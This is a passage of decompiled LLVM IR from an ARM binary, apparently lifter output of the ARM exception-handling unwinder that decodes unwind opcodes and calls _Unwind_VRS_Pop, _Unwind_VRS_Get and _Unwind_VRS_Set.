  %v0_18f38 = load i32, i32* %r3.global-to-local, align 4
  %v1_18f38 = trunc i32 %v0_18f38 to i8
  %v2_18f38 = load i32, i32* @r5, align 4
  %v3_18f38 = add i32 %v2_18f38, 8
  %v4_18f38 = inttoptr i32 %v3_18f38 to i8*
  store i8 %v1_18f38, i8* %v4_18f38, align 1
  %v0_18f3c = load i32, i32* %r0.global-to-local, align 4
  %v1_18f3c = load i32, i32* @r5, align 4
  %v2_18f3c = inttoptr i32 %v1_18f3c to i32*
  store i32 %v0_18f3c, i32* %v2_18f3c, align 4
  br label %dec_label_pc_18f40

dec_label_pc_18f40:                               ; preds = %.thread48, %dec_label_pc_18f20
  %v0_18f40 = load i32, i32* %r0.global-to-local, align 4
  %v3_18f40 = udiv i32 %v0_18f40, 16777216
  %v1_18f44 = urem i32 %v3_18f40, 16
  %v3_18f48 = mul i32 %v0_18f40, 256
  store i32 %v3_18f48, i32* %r0.global-to-local, align 4
  %v1_18f4c = add nuw nsw i32 %v1_18f44, 1
  store i32 %v1_18f4c, i32* %r2.global-to-local, align 4
  %v1_18f50 = and i32 %v3_18f40, 240
  store i32 %v1_18f50, i32* %r3.global-to-local, align 4
  %v1_18f54 = load i32, i32* @r5, align 4
  %v2_18f54 = inttoptr i32 %v1_18f54 to i32*
  store i32 %v3_18f48, i32* %v2_18f54, align 4
  %v0_18f58 = load i32, i32* %r2.global-to-local, align 4
  %v1_18f58 = load i32, i32* %r3.global-to-local, align 4
  %v4_18f58 = mul i32 %v1_18f58, 4096
  %v5_18f58 = or i32 %v4_18f58, %v0_18f58
  br label %dec_label_pc_18f5c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f0c, %dec_label_pc_18f40
  %storemerge131 = phi i32 [ %v5_18f58, %dec_label_pc_18f40 ], [ 720897, %dec_label_pc_18f0c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18f64:                               ; preds = %dec_label_pc_18d20
  %v0_18f64 = load i32, i32* @r5, align 4
  %v1_18f64 = add i32 %v0_18f64, 8
  %v2_18f64 = inttoptr i32 %v1_18f64 to i8*
  %v3_18f64 = load i8, i8* %v2_18f64, align 1
  %v4_18f64 = zext i8 %v3_18f64 to i32
  store i32 %v4_18f64, i32* %r3.global-to-local, align 4
  %v2_18f68 = icmp eq i8 %v3_18f64, 0
  store i1 %v2_18f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f68, label %dec_label_pc_18f78, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_18f64
  %v2_18f6c = add nsw i32 %v4_18f64, -1
  store i32 %v2_18f6c, i32* %r3.global-to-local, align 4
  %v2_18f70 = trunc i32 %v2_18f6c to i8
  store i8 %v2_18f70, i8* %v2_18f64, align 1
  %v0_18f74.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f74.pr.pr, label %.thread52.dec_label_pc_18f78_crit_edge, label %dec_label_pc_18fac

.thread52.dec_label_pc_18f78_crit_edge:           ; preds = %.thread52
  %v0_18f78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f78

dec_label_pc_18f78:                               ; preds = %.thread52.dec_label_pc_18f78_crit_edge, %dec_label_pc_18f64
  %v2_18f90 = phi i32 [ %v0_18f78.pre, %.thread52.dec_label_pc_18f78_crit_edge ], [ %v0_18f64, %dec_label_pc_18f64 ]
  %v1_18f78 = add i32 %v2_18f90, 9
  %v2_18f78 = inttoptr i32 %v1_18f78 to i8*
  %v3_18f78 = load i8, i8* %v2_18f78, align 1
  %v4_18f78 = zext i8 %v3_18f78 to i32
  store i32 %v4_18f78, i32* %r3.global-to-local, align 4
  %v2_18f7c = icmp eq i8 %v3_18f78, 0
  store i1 %v2_18f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f7c, label %dec_label_pc_18fc8, label %dec_label_pc_18f8c

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f78
  %v1_18f8c = add nsw i32 %v4_18f78, -1
  store i32 %v1_18f8c, i32* %r3.global-to-local, align 4
  %v1_18f90 = trunc i32 %v1_18f8c to i8
  store i8 %v1_18f90, i8* %v2_18f78, align 1
  %v0_18f94 = load i32, i32* @r5, align 4
  %v1_18f94 = add i32 %v0_18f94, 4
  %v2_18f94 = inttoptr i32 %v1_18f94 to i32*
  %v3_18f94 = load i32, i32* %v2_18f94, align 4
  store i32 %v3_18f94, i32* %r2.global-to-local, align 4
  %v1_18f98 = inttoptr i32 %v3_18f94 to i32*
  %v2_18f98 = load i32, i32* %v1_18f98, align 4
  store i32 %v2_18f98, i32* %r0.global-to-local, align 4
  %v4_18f98 = add i32 %v3_18f94, 4
  store i32 %v4_18f98, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18f98, i32* %v2_18f94, align 4
  %v0_18fa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18fa4 = trunc i32 %v0_18fa4 to i8
  %v2_18fa4 = load i32, i32* @r5, align 4
  %v3_18fa4 = add i32 %v2_18fa4, 8
  %v4_18fa4 = inttoptr i32 %v3_18fa4 to i8*
  store i8 %v1_18fa4, i8* %v4_18fa4, align 1
  %v0_18fa8 = load i32, i32* %r0.global-to-local, align 4
  %v1_18fa8 = load i32, i32* @r5, align 4
  %v2_18fa8 = inttoptr i32 %v1_18fa8 to i32*
  store i32 %v0_18fa8, i32* %v2_18fa8, align 4
  br label %dec_label_pc_18fac

dec_label_pc_18fac:                               ; preds = %.thread52, %dec_label_pc_18f8c
  %v0_18fac = load i32, i32* %r0.global-to-local, align 4
  %v3_18fac = udiv i32 %v0_18fac, 16777216
  %v1_18fb0 = urem i32 %v3_18fac, 16
  %v3_18fb4 = mul i32 %v0_18fac, 256
  store i32 %v3_18fb4, i32* %r0.global-to-local, align 4
  %v1_18fb8 = add nuw nsw i32 %v1_18fb0, 1
  store i32 %v1_18fb8, i32* %r2.global-to-local, align 4
  %v1_18fbc = and i32 %v3_18fac, 240
  store i32 %v1_18fbc, i32* %r3.global-to-local, align 4
  %v1_18fc0 = load i32, i32* @r5, align 4
  %v2_18fc0 = inttoptr i32 %v1_18fc0 to i32*
  store i32 %v3_18fb4, i32* %v2_18fc0, align 4
  %v0_18fc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18fc4 = load i32, i32* %r3.global-to-local, align 4
  %v4_18fc4 = mul i32 %v1_18fc4, 4096
  %v5_18fc4 = or i32 %v4_18fc4, %v0_18fc4
  br label %dec_label_pc_18fc8

dec_label_pc_18fc8:                               ; preds = %dec_label_pc_18f78, %dec_label_pc_18fac
  %storemerge130 = phi i32 [ %v5_18fc4, %dec_label_pc_18fac ], [ 720897, %dec_label_pc_18f78 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18fd0:                               ; preds = %dec_label_pc_18cfc
  %v0_18fd0 = load i32, i32* @r5, align 4
  %v1_18fd0 = add i32 %v0_18fd0, 8
  %v2_18fd0 = inttoptr i32 %v1_18fd0 to i8*
  %v3_18fd0 = load i8, i8* %v2_18fd0, align 1
  %v4_18fd0 = zext i8 %v3_18fd0 to i32
  store i32 %v4_18fd0, i32* %r3.global-to-local, align 4
  %v2_18fd4 = icmp eq i8 %v3_18fd0, 0
  store i1 %v2_18fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fd4, label %dec_label_pc_1917c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_18fd0
  %v2_18fd8 = add nsw i32 %v4_18fd0, -1
  store i32 %v2_18fd8, i32* %r3.global-to-local, align 4
  %v2_18fdc = trunc i32 %v2_18fd8 to i8
  store i8 %v2_18fdc, i8* %v2_18fd0, align 1
  %v0_18fe0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18fe0.pr.pr, label %.thread56.dec_label_pc_1917c_crit_edge, label %dec_label_pc_18fe4

.thread56.dec_label_pc_1917c_crit_edge:           ; preds = %.thread56
  %v0_1917c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1917c

dec_label_pc_18fe4:                               ; preds = %.thread56, %dec_label_pc_19188
  %v0_18fe4 = load i32, i32* %r0.global-to-local, align 4
  %v3_18fe4 = udiv i32 %v0_18fe4, 16777216
  store i32 %v3_18fe4, i32* %r3.global-to-local, align 4
  store i32 %v3_18fe4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_18fe4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_18fec = mul i32 %v0_18fe4, 256
  store i32 %v3_18fec, i32* %r0.global-to-local, align 4
  %v1_18ff0 = load i32, i32* @r5, align 4
  %v2_18ff0 = inttoptr i32 %v1_18ff0 to i32*
  store i32 %v3_18fec, i32* %v2_18ff0, align 4
  br i1 %tmp184, label %dec_label_pc_18dac, label %dec_label_pc_18ff8

dec_label_pc_18ff8:                               ; preds = %dec_label_pc_18fe4
  %v0_18ff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18ff8 = and i32 %v0_18ff8, 240
  store i32 %v1_18ff8, i32* %r3.global-to-local, align 4
  %v2_18ff8 = icmp eq i32 %v1_18ff8, 0
  store i1 %v2_18ff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ff8, label %dec_label_pc_19000, label %dec_label_pc_18dac

dec_label_pc_19000:                               ; preds = %dec_label_pc_18ff8
  %v0_19000 = load i32, i32* @r7, align 4
  store i32 %v0_19000, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19008 = load i32, i32* %r2.global-to-local, align 4
  %v4_19008 = call i32 @_Unwind_VRS_Pop(i32 %v0_19000, i32 4, i32 %v2_19008, i32 0)
  store i32 %v4_19008, i32* %r0.global-to-local, align 4
  %v2_1900c = icmp eq i32 %v4_19008, 0
  store i1 %v2_1900c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1900c, label %dec_label_pc_18adc.backedge, label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_19000
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c04

dec_label_pc_1901c:                               ; preds = %dec_label_pc_18e48
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19028 = load i32, i32* @r7, align 4
  store i32 %v0_19028, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_19034 = call i32 @_Unwind_VRS_Get(i32 %v0_19028, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19034, i32* %r0.global-to-local, align 4
  %v0_19038 = load i32, i32* @r5, align 4
  %v1_19038 = add i32 %v0_19038, 8
  %v2_19038 = inttoptr i32 %v1_19038 to i8*
  %v3_19038 = load i8, i8* %v2_19038, align 1
  %v4_19038 = zext i8 %v3_19038 to i32
  store i32 %v4_19038, i32* %r1.global-to-local, align 4
  %v2_1903c = icmp eq i8 %v3_19038, 0
  store i1 %v2_1903c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1903c, label %dec_label_pc_1904c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1901c
  %v2_19040 = add nsw i32 %v4_19038, -1
  store i32 %v2_19040, i32* %r3.global-to-local, align 4
  %v2_19044 = trunc i32 %v2_19040 to i8
  store i8 %v2_19044, i8* %v2_19038, align 1
  %v0_19048.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19048.pr.pr, label %.thread58.dec_label_pc_1904c_crit_edge, label %dec_label_pc_19078

.thread58.dec_label_pc_1904c_crit_edge:           ; preds = %.thread58
  %v0_1904c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1904c

dec_label_pc_1904c:                               ; preds = %.thread58.dec_label_pc_1904c_crit_edge, %dec_label_pc_1901c
  %v2_19060 = phi i32 [ %v0_1904c.pre, %.thread58.dec_label_pc_1904c_crit_edge ], [ %v0_19038, %dec_label_pc_1901c ]
  %v1_1904c = add i32 %v2_19060, 9
  %v2_1904c = inttoptr i32 %v1_1904c to i8*
  %v3_1904c = load i8, i8* %v2_1904c, align 1
  %v4_1904c = zext i8 %v3_1904c to i32
  store i32 %v4_1904c, i32* %r3.global-to-local, align 4
  %v2_19050 = icmp eq i8 %v3_1904c, 0
  store i1 %v2_19050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19050, label %bb158, label %dec_label_pc_1905c

bb158:                                            ; preds = %dec_label_pc_1904c
  %v1_19054 = load i32, i32* @r6, align 4
  store i32 %v1_19054, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_190a0

dec_label_pc_1905c:                               ; preds = %dec_label_pc_1904c
  %v1_1905c = add nsw i32 %v4_1904c, -1
  store i32 %v1_1905c, i32* %r3.global-to-local, align 4
  %v1_19060 = trunc i32 %v1_1905c to i8
  store i8 %v1_19060, i8* %v2_1904c, align 1
  %v0_19064 = load i32, i32* @r5, align 4
  %v1_19064 = add i32 %v0_19064, 4
  %v2_19064 = inttoptr i32 %v1_19064 to i32*
  %v3_19064 = load i32, i32* %v2_19064, align 4
  store i32 %v3_19064, i32* %r2.global-to-local, align 4
  %v1_19068 = inttoptr i32 %v3_19064 to i32*
  %v2_19068 = load i32, i32* %v1_19068, align 4
  store i32 %v2_19068, i32* %r0.global-to-local, align 4
  %v4_19068 = add i32 %v3_19064, 4
  store i32 %v4_19068, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19070 = inttoptr i32 %v0_19064 to i32*
  store i32 %v2_19068, i32* %v1_19070, align 4
  %v5_19070 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19070, i32* %v2_19064, align 4
  %v0_19074 = load i32, i32* %r3.global-to-local, align 4
  %v1_19074 = trunc i32 %v0_19074 to i8
  %v2_19074 = load i32, i32* @r5, align 4
  %v3_19074 = add i32 %v2_19074, 8
  %v4_19074 = inttoptr i32 %v3_19074 to i8*
  store i8 %v1_19074, i8* %v4_19074, align 1
  br label %dec_label_pc_19078

dec_label_pc_19078:                               ; preds = %.thread58, %dec_label_pc_1905c
  %v0_19078 = load i32, i32* @r5, align 4
  %v1_19078 = inttoptr i32 %v0_19078 to i32*
  %v2_19078 = load i32, i32* %v1_19078, align 4
  store i32 %v2_19078, i32* %r3.global-to-local, align 4
  %v3_1907c = mul i32 %v2_19078, 256
  store i32 %v3_1907c, i32* %r0.global-to-local, align 4
  %v3_19080 = udiv i32 %v2_19078, 16777216
  store i32 %v3_19080, i32* %r2.global-to-local, align 4
  store i32 %v3_1907c, i32* %v1_19078, align 4
  %v0_19088 = load i32, i32* %r2.global-to-local, align 4
  %v1_19088 = and i32 %v0_19088, 128
  %v2_19088 = icmp eq i32 %v1_19088, 0
  store i1 %v2_19088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19088, label %.thread129, label %dec_label_pc_1909c

.thread129:                                       ; preds = %dec_label_pc_19078
  %v4_1908c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1908c, i32* %ip.global-to-local, align 4
  %v1_19090 = urem i32 %v0_19088, 256
  store i32 %v1_19090, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_19110

dec_label_pc_1909c:                               ; preds = %dec_label_pc_19078
  %v1_1909063 = urem i32 %v0_19088, 256
  store i32 %v1_1909063, i32* %r2.global-to-local, align 4
  %v0_1909c = load i32, i32* @r5, align 4
  %v1_1909c = add i32 %v0_1909c, 8
  %v2_1909c = inttoptr i32 %v1_1909c to i8*
  %v3_1909c = load i8, i8* %v2_1909c, align 1
  %v4_1909c = zext i8 %v3_1909c to i32
  store i32 %v4_1909c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_190a0

dec_label_pc_190a0:                               ; preds = %bb158, %dec_label_pc_1909c
  %v3_190c099 = phi i32 [ %v2_19060, %bb158 ], [ %v0_1909c, %dec_label_pc_1909c ]
  %v0_190a892 = phi i32 [ %v1_19054, %bb158 ], [ %v1_1909063, %dec_label_pc_1909c ]
  %v3_190a0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_190a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_190a8

dec_label_pc_190a8:                               ; preds = %dec_label_pc_190a8.backedge, %dec_label_pc_190a0
  %v3_190c0 = phi i32 [ %v3_190c0100, %dec_label_pc_190a8.backedge ], [ %v3_190c099, %dec_label_pc_190a0 ]
  %v0_190bc = phi i32 [ %v2_190ac.pre, %dec_label_pc_190a8.backedge ], [ 2, %dec_label_pc_190a0 ]
  %v0_190ac = phi i32 [ %v0_190ac.pre, %dec_label_pc_190a8.backedge ], [ %v3_190a0, %dec_label_pc_190a0 ]
  %v0_190a8 = phi i32 [ %v0_190a895, %dec_label_pc_190a8.backedge ], [ %v0_190a892, %dec_label_pc_190a0 ]
  %v1_190a8 = urem i32 %v0_190a8, 128
  %v7_190ac = shl i32 %v1_190a8, %v0_190bc
  %v8_190ac = add i32 %v7_190ac, %v0_190ac
  store i32 %v8_190ac, i32* %ip.global-to-local, align 4
  %v0_190b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_190b0 = icmp eq i32 %v0_190b0, 0
  store i1 %v2_190b0, i1* %cpsr_z.global-to-local, align 1
  %v1_190b4 = add i32 %v0_190b0, -1
  store i32 %v1_190b4, i32* %r3.global-to-local, align 4
  store i32 %v8_190ac, i32* %stack_var_-36, align 4
  %v1_190bc = add i32 %v0_190bc, 7
  store i32 %v1_190bc, i32* @lr, align 4
  br i1 %v2_190b0, label %dec_label_pc_190c8, label %bb159

bb159:                                            ; preds = %dec_label_pc_190a8
  %v2_190c0 = trunc i32 %v1_190b4 to i8
  %v4_190c0 = add i32 %v3_190c0, 8
  %v5_190c0 = inttoptr i32 %v4_190c0 to i8*
  store i8 %v2_190c0, i8* %v5_190c0, align 1
  %v0_190c4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_190c4.pr, label %.dec_label_pc_190c8_crit_edge, label %dec_label_pc_190f4

.dec_label_pc_190c8_crit_edge:                    ; preds = %bb159
  %v0_190c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_190c8

dec_label_pc_190c8:                               ; preds = %.dec_label_pc_190c8_crit_edge, %dec_label_pc_190a8
  %v2_190e0 = phi i32 [ %v0_190c8.pre, %.dec_label_pc_190c8_crit_edge ], [ %v3_190c0, %dec_label_pc_190a8 ]
  %v1_190c8 = add i32 %v2_190e0, 9
  %v2_190c8 = inttoptr i32 %v1_190c8 to i8*
  %v3_190c8 = load i8, i8* %v2_190c8, align 1
  %v4_190c8 = zext i8 %v3_190c8 to i32
  store i32 %v4_190c8, i32* %r3.global-to-local, align 4
  %v2_190cc = icmp eq i8 %v3_190c8, 0
  store i1 %v2_190cc, i1* %cpsr_z.global-to-local, align 1
  %v1_190d0 = add nsw i32 %v4_190c8, -1
  store i32 %v1_190d0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_190cc, label %dec_label_pc_190a8.backedge, label %dec_label_pc_190dc

dec_label_pc_190dc:                               ; preds = %dec_label_pc_190c8
  %v1_190dc = add i32 %v2_190e0, 4
  %v2_190dc = inttoptr i32 %v1_190dc to i32*
  %v3_190dc = load i32, i32* %v2_190dc, align 4
  store i32 %v3_190dc, i32* %r2.global-to-local, align 4
  %v1_190e0 = trunc i32 %v1_190d0 to i8
  store i8 %v1_190e0, i8* %v2_190c8, align 1
  %v0_190e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_190e4 = inttoptr i32 %v0_190e4 to i32*
  %v2_190e4 = load i32, i32* %v1_190e4, align 4
  store i32 %v2_190e4, i32* %r0.global-to-local, align 4
  %v4_190e4 = add i32 %v0_190e4, 4
  store i32 %v4_190e4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_190ec = load i32, i32* @r5, align 4
  %v3_190ec = add i32 %v2_190ec, 8
  %v4_190ec = inttoptr i32 %v3_190ec to i8*
  store i8 3, i8* %v4_190ec, align 1
  %v0_190f0 = load i32, i32* @r5, align 4
  %v1_190f0 = inttoptr i32 %v0_190f0 to i32*
  %v2_190f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_190f0, i32* %v1_190f0, align 4
  %v3_190f0 = add i32 %v0_190f0, 4
  %v4_190f0 = inttoptr i32 %v3_190f0 to i32*
  %v5_190f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_190f0, i32* %v4_190f0, align 4
  br label %dec_label_pc_190f4

dec_label_pc_190f4:                               ; preds = %bb159, %dec_label_pc_190dc
  %v0_190f4 = load i32, i32* @r5, align 4
  %v1_190f4 = inttoptr i32 %v0_190f4 to i32*
  %v2_190f4 = load i32, i32* %v1_190f4, align 4
  store i32 %v2_190f4, i32* %r3.global-to-local, align 4
  %v3_190f8 = udiv i32 %v2_190f4, 16777216
  store i32 %v3_190f8, i32* %r2.global-to-local, align 4
  %v1_190fc = and i32 %v3_190f8, 128
  %v2_190fc = icmp eq i32 %v1_190fc, 0
  store i1 %v2_190fc, i1* %cpsr_z.global-to-local, align 1
  %v3_19100 = mul i32 %v2_190f4, 256
  store i32 %v3_19100, i32* %r0.global-to-local, align 4
  store i32 %v3_19100, i32* %v1_190f4, align 4
  %v0_19108 = load i32, i32* %r2.global-to-local, align 4
  %v1_19108 = urem i32 %v0_19108, 256
  store i32 %v1_19108, i32* %r2.global-to-local, align 4
  br i1 %v2_190fc, label %dec_label_pc_19110.loopexit, label %dec_label_pc_1913c

dec_label_pc_19110.loopexit:                      ; preds = %dec_label_pc_190f4
  %v0_19114.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19118.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19110

dec_label_pc_19110:                               ; preds = %dec_label_pc_19110.loopexit, %.thread129
  %v2_19118 = phi i32 [ 2, %.thread129 ], [ %v2_19118.pre, %dec_label_pc_19110.loopexit ]
  %v0_19114 = phi i32 [ %v4_1908c, %.thread129 ], [ %v0_19114.pre, %dec_label_pc_19110.loopexit ]
  %v0_19110 = phi i32 [ %v1_19090, %.thread129 ], [ %v1_19108, %dec_label_pc_19110.loopexit ]
  %v1_19110 = urem i32 %v0_19110, 128
  %v1_19114 = add i32 %v0_19114, 516
  %v7_19118 = shl i32 %v1_19110, %v2_19118
  %v8_19118 = add i32 %v1_19114, %v7_19118
  store i32 %v8_19118, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19120 = load i32, i32* @r7, align 4
  store i32 %v0_19120, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_19118, i32* %stack_var_-36, align 4
  %v5_19134 = call i32 @_Unwind_VRS_Set(i32 %v0_19120, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18adc.backedge

dec_label_pc_1913c:                               ; preds = %dec_label_pc_190f4
  %v0_1913c = load i32, i32* @r5, align 4
  %v1_1913c = add i32 %v0_1913c, 8
  %v2_1913c = inttoptr i32 %v1_1913c to i8*
  %v3_1913c = load i8, i8* %v2_1913c, align 1
  %v4_1913c = zext i8 %v3_1913c to i32
  store i32 %v4_1913c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_190a8.backedge

dec_label_pc_190a8.backedge:                      ; preds = %dec_label_pc_1913c, %dec_label_pc_190c8
  %v3_190c0100 = phi i32 [ %v0_1913c, %dec_label_pc_1913c ], [ %v2_190e0, %dec_label_pc_190c8 ]
  %v0_190a895 = phi i32 [ %v1_19108, %dec_label_pc_1913c ], [ 176, %dec_label_pc_190c8 ]
  %v0_190ac.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_190ac.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_190a8

dec_label_pc_19144:                               ; preds = %dec_label_pc_18e40
  %v0_19144 = load i32, i32* @r5, align 4
  %v1_19144 = add i32 %v0_19144, 8
  %v2_19144 = inttoptr i32 %v1_19144 to i8*
  %v3_19144 = load i8, i8* %v2_19144, align 1
  %v4_19144 = zext i8 %v3_19144 to i32
  store i32 %v4_19144, i32* %r3.global-to-local, align 4
  %v2_19148 = icmp eq i8 %v3_19144, 0
  store i1 %v2_19148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19148, label %dec_label_pc_191ac, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_19144
  %v2_1914c = add nsw i32 %v4_19144, -1
  store i32 %v2_1914c, i32* %r3.global-to-local, align 4
  %v2_19150 = trunc i32 %v2_1914c to i8
  store i8 %v2_19150, i8* %v2_19144, align 1
  %v0_19154.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19154.pr.pr, label %.thread66.dec_label_pc_191ac_crit_edge, label %dec_label_pc_19158

.thread66.dec_label_pc_191ac_crit_edge:           ; preds = %.thread66
  %v0_191ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_191ac

dec_label_pc_19158:                               ; preds = %.thread66, %dec_label_pc_191b8
  %v0_19158 = load i32, i32* %r0.global-to-local, align 4
  %v3_19158 = udiv i32 %v0_19158, 16777216
  store i32 %v3_19158, i32* %r3.global-to-local, align 4
  store i32 %v3_19158, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_19158, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_19160 = mul i32 %v0_19158, 256
  store i32 %v3_19160, i32* %r0.global-to-local, align 4
  %v1_19164 = load i32, i32* @r5, align 4
  %v2_19164 = inttoptr i32 %v1_19164 to i32*
  store i32 %v3_19160, i32* %v2_19164, align 4
  br i1 %tmp185, label %dec_label_pc_18dac, label %dec_label_pc_1916c

dec_label_pc_1916c:                               ; preds = %dec_label_pc_19158
  %v0_1916c = load i32, i32* %r3.global-to-local, align 4
  %v1_1916c = and i32 %v0_1916c, 240
  store i32 %v1_1916c, i32* %r1.global-to-local, align 4
  %v2_1916c = icmp eq i32 %v1_1916c, 0
  store i1 %v2_1916c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1916c, label %dec_label_pc_1916c.dec_label_pc_18ddc_crit_edge, label %dec_label_pc_19174

dec_label_pc_1916c.dec_label_pc_18ddc_crit_edge:  ; preds = %dec_label_pc_1916c
  %v2_18de4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_19174:                               ; preds = %dec_label_pc_1916c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c04

dec_label_pc_1917c:                               ; preds = %.thread56.dec_label_pc_1917c_crit_edge, %dec_label_pc_18fd0
  %v2_1918c = phi i32 [ %v0_1917c.pre, %.thread56.dec_label_pc_1917c_crit_edge ], [ %v0_18fd0, %dec_label_pc_18fd0 ]
  %v1_1917c = add i32 %v2_1918c, 9
  %v2_1917c = inttoptr i32 %v1_1917c to i8*
  %v3_1917c = load i8, i8* %v2_1917c, align 1
  %v4_1917c = zext i8 %v3_1917c to i32
  store i32 %v4_1917c, i32* %r3.global-to-local, align 4
  %v2_19180 = icmp eq i8 %v3_1917c, 0
  store i1 %v2_19180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19180, label %dec_label_pc_18dac, label %dec_label_pc_19188

dec_label_pc_19188:                               ; preds = %dec_label_pc_1917c
  %v1_19188 = add nsw i32 %v4_1917c, -1
  store i32 %v1_19188, i32* %r3.global-to-local, align 4
  %v1_1918c = trunc i32 %v1_19188 to i8
  store i8 %v1_1918c, i8* %v2_1917c, align 1
  %v0_19190 = load i32, i32* @r5, align 4
  %v1_19190 = add i32 %v0_19190, 4
  %v2_19190 = inttoptr i32 %v1_19190 to i32*
  %v3_19190 = load i32, i32* %v2_19190, align 4
  store i32 %v3_19190, i32* %r2.global-to-local, align 4
  %v1_19194 = inttoptr i32 %v3_19190 to i32*
  %v2_19194 = load i32, i32* %v1_19194, align 4
  store i32 %v2_19194, i32* %r0.global-to-local, align 4
  %v4_19194 = add i32 %v3_19190, 4
  store i32 %v4_19194, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19194, i32* %v2_19190, align 4
  %v0_191a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_191a0 = trunc i32 %v0_191a0 to i8
  %v2_191a0 = load i32, i32* @r5, align 4
  %v3_191a0 = add i32 %v2_191a0, 8
  %v4_191a0 = inttoptr i32 %v3_191a0 to i8*
  store i8 %v1_191a0, i8* %v4_191a0, align 1
  %v0_191a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_191a4 = load i32, i32* @r5, align 4
  %v2_191a4 = inttoptr i32 %v1_191a4 to i32*
  store i32 %v0_191a4, i32* %v2_191a4, align 4
  br label %dec_label_pc_18fe4

dec_label_pc_191ac:                               ; preds = %.thread66.dec_label_pc_191ac_crit_edge, %dec_label_pc_19144
  %v2_191bc = phi i32 [ %v0_191ac.pre, %.thread66.dec_label_pc_191ac_crit_edge ], [ %v0_19144, %dec_label_pc_19144 ]
  %v1_191ac = add i32 %v2_191bc, 9
  %v2_191ac = inttoptr i32 %v1_191ac to i8*
  %v3_191ac = load i8, i8* %v2_191ac, align 1
  %v4_191ac = zext i8 %v3_191ac to i32
  store i32 %v4_191ac, i32* %r3.global-to-local, align 4
  %v2_191b0 = icmp eq i8 %v3_191ac, 0
